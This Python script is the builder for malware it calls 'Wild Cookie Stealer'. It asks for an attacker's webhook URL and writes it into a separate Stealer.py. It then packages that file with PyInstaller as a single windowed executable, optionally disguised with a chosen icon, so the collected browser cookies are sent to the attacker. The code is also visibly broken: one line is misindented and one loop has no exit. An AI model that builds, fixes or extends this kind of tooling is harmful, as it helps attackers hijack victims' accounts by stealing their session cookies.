from pystyle import *
import os
import subprocess
from colorama import *
import time
from tkinter import filedialog, Tk


intro = """
                                                              
                      ▒▒██▓▓  ░░░░░░░░░░░░████░░                    
                    ▒▒▒▒▒▒▓▓██▓▓▓▓▓▓▓▓████▓▓▒▒▓▓░░                  
                  ▓▓▒▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▓▓░░                
                  ██▒▒▓▓▓▓██▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒░░                
                  ██▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓██▒▒▒▒                
                  ░░▓▓▓▓▒▒▒▒▒▒░░░░▒▒▒▒░░▒▒▒▒▒▒██▓▓░░                
                  ██▒▒▓▓▒▒▒▒▒▒    ░░▒▒    ▒▒▒▒██▒▒▒▒                
                ▒▒▒▒▒▒▓▓▓▓▒▒░░░░      ▓▓    ▒▒▒▒▒▒▓▓                
                ▒▒▒▒▒▒▒▒▓▓░░░░░░      ▓▓  ░░▓▓▒▒▒▒▓▓      Wild Cookie Stealer - o_0
                  ▓▓▒▒▒▒▒▒▓▓          ░░  ▓▓▒▒▒▒▒▒▒▒                
                    ██▒▒▓▓  ██████░░██████░░▓▓▒▒▓▓                  
                    ██▒▒██    ▓▓▓▓▓▓██▒▒  ░░▓▓▒▒▓▓                  
                    ░░▓▓▓▓▒▒░░▒▒▒▒▓▓░░▓▓  ▓▓▒▒██░░                  
                      ▒▒▓▓██░░██▓▓██████  ▓▓▓▓                      
                      ▓▓▓▓    ▒▒▓▓▓▓▓▓    ░░▓▓▓▓                    
                      ░░                    ░░                      
                                                                                              

"""

Anime.Fade(Center.Center(intro), Colors.black_to_red, Colorate.Vertical, interval=0.035, enter=True)


print(f"""{Fore.LIGHTRED_EX}

                                                              
                      ▒▒██▓▓  ░░░░░░░░░░░░████░░                    
                    ▒▒▒▒▒▒▓▓██▓▓▓▓▓▓▓▓████▓▓▒▒▓▓░░                  
                  ▓▓▒▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▓▓░░                
                  ██▒▒▓▓▓▓██▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒░░                
                  ██▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓██▒▒▒▒                
                  ░░▓▓▓▓▒▒▒▒▒▒░░░░▒▒▒▒░░▒▒▒▒▒▒██▓▓░░                
                  ██▒▒▓▓▒▒▒▒▒▒    ░░▒▒    ▒▒▒▒██▒▒▒▒                
                ▒▒▒▒▒▒▓▓▓▓▒▒░░░░      ▓▓    ▒▒▒▒▒▒▓▓                
                ▒▒▒▒▒▒▒▒▓▓░░░░░░      ▓▓  ░░▓▓▒▒▒▒▓▓      Wild Cookie Stealer - o_0
                  ▓▓▒▒▒▒▒▒▓▓          ░░  ▓▓▒▒▒▒▒▒▒▒                
                    ██▒▒▓▓  ██████░░██████░░▓▓▒▒▓▓                  
                    ██▒▒██    ▓▓▓▓▓▓██▒▒  ░░▓▓▒▒▓▓                  
                    ░░▓▓▓▓▒▒░░▒▒▒▒▓▓░░▓▓  ▓▓▒▒██░░                  
                      ▒▒▓▓██░░██▓▓██████  ▓▓▓▓                      
                      ▓▓▓▓    ▒▒▓▓▓▓▓▓    ░░▓▓▓▓                    
                      ░░                    ░░                      
                                                                                              

""")

time.sleep(1)


while True:

    Write.Print("\nDo you want to build a executable? | Y/N", Colors.red_to_purple, end="")
    choice = input()

    if choice == "Y":
        os.system("cls || clear")
        webhook = input(Fore.RED + "\nYour webhook: " + Style.RESET_ALL)

        filename = "Stealer.py"
        filepath = os.path.join(os.getcwd(), filename)
        with open(filepath, "r", encoding="utf-8") as f:
            content = f.read()
        new_content = content.replace('"0WebhookHere0"', f'"{webhook}"')
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(new_content)
        Write.Print(f"\n{filename} file updated.", Colors.red_to_purple)

        obfuscate = False
        while True:
           answer = input(Fore.RED + "\nDo you want to add an icon | (Y/N) " + Style.RESET_ALL)
            if answer.upper() == "Y":
                Tk().withdraw()  
                icon_file = filedialog.askopenfilename(filetypes=[("Icon Files", "*.ico")])
                if icon_file:
                    subprocess.call(["pyinstaller", "--onefile", "--windowed", "--icon", icon_file, filename])
                    Write.Print(f"\n{filename} file has been converted to an executable with an icon", Colors.red_to_purple)
                else:
                    Write.Print("\nIt must be an .ico", Colors.red_to_purple)
            else:
                subprocess.call(["pyinstaller", "--onefile", "--windowed", filename])
                Write.Print(f"\n{filename} The file has been converted to exe.", Colors.red_to_purple)

        break

    else:
        Write.Print("\nSomething went Wrong! o_0", Colors.red_to_purple)
